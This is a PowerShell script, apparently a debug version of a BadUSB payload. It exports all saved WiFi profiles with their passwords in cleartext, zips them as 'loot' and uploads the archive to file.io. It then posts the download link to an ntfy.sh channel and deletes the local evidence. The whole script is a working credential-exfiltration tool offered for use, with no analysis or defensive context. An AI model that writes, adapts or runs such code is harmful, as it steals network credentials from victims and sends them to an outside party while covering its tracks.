# --- CONFIG ---
$topic = "data_stwealer_hideen_"
$ErrorActionPreference = "Continue"

Write-Host "=== [ BADUSB DEBUG CONSOLE ] ===" -ForegroundColor Cyan
Write-Host "[*] Target ntfy channel: https://ntfy.sh/$topic" -ForegroundColor Gray

# 1. SETUP WORKSPACE
Write-Host "`n[1] Initializing Workspace..." -ForegroundColor White
$dir = "$env:TEMP\LootBox"
$zip = "$env:TEMP\package.zip"

if (Test-Path $dir) { 
    Write-Host "    [!] Cleaning old folder..." -ForegroundColor Gray
    Remove-Item -Recurse -Force $dir 
}
mkdir $dir | Out-Null
if (Test-Path $zip) { Remove-Item -Force $zip }
Write-Host "    [+] Workspace Ready: $dir" -ForegroundColor Green

# 2. EXPORT WIFI
Write-Host "`n[2] Extracting WiFi Profiles..." -ForegroundColor White
netsh wlan export profile folder=$dir key=clear | Out-Null

$fileCount = (Get-ChildItem $dir).Count
if ($fileCount -gt 0) {
    Write-Host "    [+] Success: Found $fileCount WiFi profiles." -ForegroundColor Green
} else {
    Write-Host "    [-] Warning: No WiFi profiles found! (Is WiFi off?)" -ForegroundColor Red
}

# 3. ZIP DATA
Write-Host "`n[3] Creating ZIP Archive..." -ForegroundColor White
try {
    Add-Type -Assembly "System.IO.Compression.FileSystem"
    [System.IO.Compression.ZipFile]::CreateFromDirectory($dir, $zip)
    Write-Host "    [+] ZIP Created: $zip" -ForegroundColor Green
} catch {
    Write-Host "    [-] ZIP Failed: $($_.Exception.Message)" -ForegroundColor Red
}

# 4. UPLOAD & NOTIFY
Write-Host "`n[4] Attempting Upload to File.io..." -ForegroundColor White
if (Test-Path $zip) {
    # Using curl.exe for better stability
    $response = curl.exe -s -F "file=@$zip" https://file.io
    
    if ($response -match '"link":"([^"]+)"') {
        $link = $matches[1]
        Write-Host "    [+] Upload Success!" -ForegroundColor Green
        Write-Host "    [+] URL: $link" -ForegroundColor Cyan
        
        Write-Host "`n[5] Sending to ntfy..." -ForegroundColor White
        Invoke-RestMethod -Uri "https://ntfy.sh/$topic" -Method Post -Body "Loot: $link"
        Write-Host "    [+] ntfy Notification Sent!" -ForegroundColor Green
    } else {
        Write-Host "    [-] Upload Failed. Response: $response" -ForegroundColor Red
    }
} else {
    Write-Host "    [-] Skipping Upload: No ZIP found." -ForegroundColor Red
}

# 5. THE ULTIMATE PAUSE
Write-Host "`n========================================" -ForegroundColor Cyan
Write-Host "DEBUG COMPLETE. Window will NOT close." -ForegroundColor Yellow
Write-Host "Review the logs above for any RED text." -ForegroundColor White
Read-Host "Press ENTER to delete loot and exit"

# Cleanup
Remove-Item -Recurse -Force $dir, $zip
Write-Host "[!] Evidence destroyed. Goodbye." -ForegroundColor Gray
